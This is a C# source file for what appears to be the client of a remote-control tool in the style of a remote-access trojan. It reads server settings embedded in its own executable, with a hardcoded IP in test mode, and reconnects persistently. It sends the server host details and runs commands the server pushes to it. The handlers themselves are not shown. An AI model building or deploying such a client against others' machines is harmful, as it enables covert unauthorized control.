using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using RemoteControl.Client.Handlers;
using RemoteControl.Client.Utils;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Codec;
using RemoteControl.Protocals.Relay;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client
{
    partial class Program
    {
        static ClientParameters ReadParameters()
        {
            ClientParameters paras = new ClientParameters();
            if (isTestMode)
            {
                paras.SetServerIP("203.91.76.159");
                paras.ServerPort = 10010;
                paras.OnlineAvatar = "";
                paras.ServiceName = "";
            }
            else
            {
                string filePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                paras = ClientParametersManager.ReadParameters(filePath);
            }
            DoOutput("参数信息:");
            if (!isTestMode)
            {
                DoOutput("IP:" + paras.GetServerIP());
                DoOutput("PORT:" + paras.ServerPort);
            }
            else
            {
                DoOutput("IP: 203.91.76.159 (test mode)");
                DoOutput("PORT: 10010 (test mode)");
            }

            return paras;
        }

        static bool StartConnect()
        {
            var paras = ReadParameters();
            var handlers = InitHandlers();
            IPEndPoint ep;
            if (isTestMode)
            {
                ep = new IPEndPoint(IPAddress.Parse("203.91.76.159"), 10010);
            }
            else
            {
                if (!ValidateClientParameters(paras))
                {
                    DoOutput("客户端参数无效，请重新生成客户端。");
                    return false;
                }
                ep = paras.GetIPEndPoint();
            }
            while (true)
            {
                try
                {
                    DoOutput("正在连接服务器...");
                    oServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    oServer.Connect(ep);
                    DoOutput("服务器连接成功！");

                    var oServerSession = new SocketSession(oServer.RemoteEndPoint.ToString(), oServer);

                    var handshake = new RelayHandshake();
                    handshake.Role = "client";
                    handshake.HostName = Dns.GetHostName();
                    handshake.AppPath = Application.ExecutablePath;
                    handshake.OnlineAvatar = paras.OnlineAvatar;
                    FillHostInfo(handshake);
                    oServerSession.Send(ePacketType.CYCLER_RELAY_HANDSHAKE, handshake);
                    oServerSession.Send(ePacketType.PACKET_GET_HOST_NAME_RESPONSE, CreateHostInfoResponse(paras));

                    StartRecvData(oServerSession, handlers);
                    return true;
                }
                catch (Exception ex)
                {
                    DoOutput("连接服务器异常，" + ex.Message);
                }
                Thread.Sleep(3000);
            }
        }

        static bool ValidateClientParameters(ClientParameters paras)
        {
            if (!isTestMode && (paras.Header == null || paras.Header.Length != 4))
                return false;

            if (paras.ServerPort <= 0 || paras.ServerPort > 65535)
                return false;

            IPAddress address;
            return IPAddress.TryParse(paras.GetServerIP(), out address);
        }

        static void StartRecvData(SocketSession session, Dictionary<ePacketType, IRequestHandler> handlers)
        {
            new Thread(() =>
            {
                byte[] buffer = new byte[1024];
                int recvSize = -1;
                List<byte> data = new List<byte>();
                while (true)
                {
                    try
                    {
                        recvSize = session.SocketObj.Receive(buffer);
                        if (recvSize <= 0)
                            break;

                        for (int i = 0; i < recvSize; i++)
                        {
                            data.Add(buffer[i]);
                        }
                        while (data.Count >= 4)
                        {
                            int packetLength = BitConverter.ToInt32(data.ToArray(), 0);
                            if (data.Count >= packetLength)
                            {
                                DoRecvBytes(session, data.SplitBytes(0, packetLength), handlers);
                                data.RemoveRange(0, packetLength);
                            }
                            else
                            {
                                break;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        DoOutput("接收数据异常: " + ex.Message);
                        break;
                    }
                }
            }) { IsBackground = true }.Start();
        }

        static void DoRecvBytes(SocketSession session, byte[] packet, Dictionary<ePacketType, IRequestHandler> handlers)
        {
            ePacketType packetType;
            object obj;
            CodecFactory.Instance.DecodeObject(packet, out packetType, out obj);
            DoOutput("收到指令: " + packetType.ToString());

            if (handlers.ContainsKey(packetType))
            {
                handlers[packetType].Handle(session, packetType, obj);
            }
        }

        static void StartHeartbeat()
        {
            while (true)
            {
                if (isClosing)
                {
                    break;
                }
                try
                {
                    if (oServer != null)
                    {
                        byte[] packet = CodecFactory.Instance.EncodeOject(ePacketType.PACKET_HEART_BEAR, null);
                        oServer.Send(packet);
                    }
                }
                catch (Exception ex)
                {
                    DoOutput("心跳发送异常，" + ex.Message);
                    StartConnect();
                }
                Thread.Sleep(3000);
            }
        }
    }
}
